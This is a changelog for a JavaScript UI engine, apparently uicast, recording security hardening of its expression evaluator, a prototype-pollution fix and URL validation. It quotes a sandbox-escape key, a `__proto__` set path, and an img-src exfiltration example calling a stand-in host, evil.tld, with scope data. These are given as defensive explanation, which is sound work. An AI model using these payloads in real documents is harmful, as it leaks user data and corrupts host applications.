# Changelog

All notable changes to this package will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

### Changed

- **`getExpressionsPartialPrompt` moved to `@uicast/expr`.** The syntax, method list, and globals now live next to the grammar and membrane that enforce them — a contract in a different package from the thing it describes drifts silently, which is exactly what happened before (the old file still advertised block-bodied arrows after the grammar had removed them). What was uicast's own in that block — `scopes`, `evt`, `currentValue`, the host-function calling rule — is now the `# Expression Context` section of `INSTRUCTIONS.md`, so `getCommonInstructionsPartialPrompt()` carries it and no separate builder exists. Assemble the language partial from its new home:

  ```ts
  getCommonInstructionsPartialPrompt(), // @uicast/core/prompt — contract + expression context
  getExpressionsPartialPrompt(),        // @uicast/expr/prompt — the language
  ```

- **Every `get*PartialPrompt` builder takes `note?`** — host-specific context rendered as that section's trailing `## Note`, verbatim. It replaces `extraScopes`: declare an injected scope via `getCommonInstructionsPartialPrompt({ note })`, which lands right under `# Expression Context`.

- **The expression evaluator moved to `@uicast/expr`, and no longer uses `new Function`.** Expressions are parsed once, checked against a closed AST allow-list, and compiled to a tree of closures; every property read and every call passes a runtime membrane, and every iteration a step/time/allocation budget. This closes the computed-key escape class (`obj["con"+"structor"]`) that a static pass could not, and removes the CSP `unsafe-eval` requirement — uicast now runs under a strict Content-Security-Policy. `core/src/expr/{safer-eval,validate,analyze,globals,ast-utils}.ts` are gone; `evaluate.ts` keeps host-function binding and `EntryError` classification.
- **The expression grammar is narrower.** No statements (so no `while`/`for`/`try`), no declarations or `function` keyword (so nothing can recurse), no assignment, no regular expressions, and a callback body must be a single expression — `items.map(x => x.name)`, not `items.map(x => { return x.name })`. `EXPRESSIONS.md` and its JSON mirror are updated to match; every expression in the shipped demo documents validates unchanged.
- The grammar drops `in`, the bitwise operators, and optional *calls* (`x?.()`); `.sort()` / `.reverse()` return a new array instead of mutating. The `evaluator` prop on `RendererProvider` selects the back end (`"interpret"` default, or `"native"` for trusted-author documents); the dead `allowGlobals` prop is removed.
- **The expression language is smaller still.** `await` is rejected (the runtime awaits host results; the prompt already said never to write it); `.sort()` / `.reverse()` are replaced by the standard non-mutating `.toSorted()` / `.toReversed()`, so immutability is structural in both back ends and the last deliberate divergence from plain JavaScript is gone; a dozen formatting methods nothing used are cut, and written method calls are now checked by the shared validator so `interpret` and `native` refuse identical sets.
- `acorn` is no longer a dependency of core — all parsing lives in `@uicast/expr`.
- `@uicast/expr` is a **peer dependency** of core, not a regular one: hosts import its prompt partial directly (`getExpressionsPartialPrompt`), and a single shared copy keeps the evaluator, the prompt, and `instanceof ExpressionError` checks on one instance.
- `evaluate` takes `maxExpressionLength` (default 1000), threaded from the renderer; an oversized expression is rejected before parsing as a classified document fault.
- **The prompt bounds list size.** A new rule in `INSTRUCTIONS.md` §6: never render an unbounded array — cap the visible slice, page through state, and reach the rest with search or a filter. The cap is `maxListItems` on `getCommonInstructionsPartialPrompt` (default 100). Rendering thousands of rows stalls the browser at paint, which no expression budget can prevent.
- **One host-function-name screen at both seams.** `evaluate` and `getFunctionsPartialPrompt` now share a rule built on `@uicast/expr/internal`'s `isUsableName`, plus uicast's own reserved names. Each previously had half the check: the prompt builder advertised names no expression can call (`foo-bar`), and `evaluate` accepted names that silently shadow `scopes` / `evt` / `currentValue` or an expression global such as `Math`. All four cases now fail fast with a host-blamed error.

### Fixed

- **Prototype pollution through a step's `set` path.** `{"set": "scopes.root.__proto__.x"}` walked out of the scope object and wrote to the host application's `Object.prototype`. Prototype-reaching segments (`__proto__`, `constructor`, `prototype`, the `__define*__`/`__lookup*__` pairs) are now rejected statically by `findSetPathFault` and again at the sink in `createProxyScope.set()`.

### Added

- `UrlPolicy`, `checkUrl`, and `findUrlViolations`: props a component definition declares as URLs (JSON Schema `format: "uri"` / `"uri-reference"`) are validated before the implementation sees them. Relative, same-origin, and raster `data:` images by default; `image/svg+xml` is excluded because SVG can carry script. Without this, a document could put `"https://evil.tld/?d=" + JSON.stringify(scopes.root.rows)` into an `<img src>` and the browser would send it on render — an exfiltration channel needing no evaluator escape.
- Initial public beta of the framework-agnostic uicast engine: entry format, JavaScript expressions evaluated by `@uicast/expr`, reactive scopes, and the prompt partial builders (`@uicast/core/prompt`). Binding plumbing lives in `@uicast/core/internal`, which carries no semver guarantee.
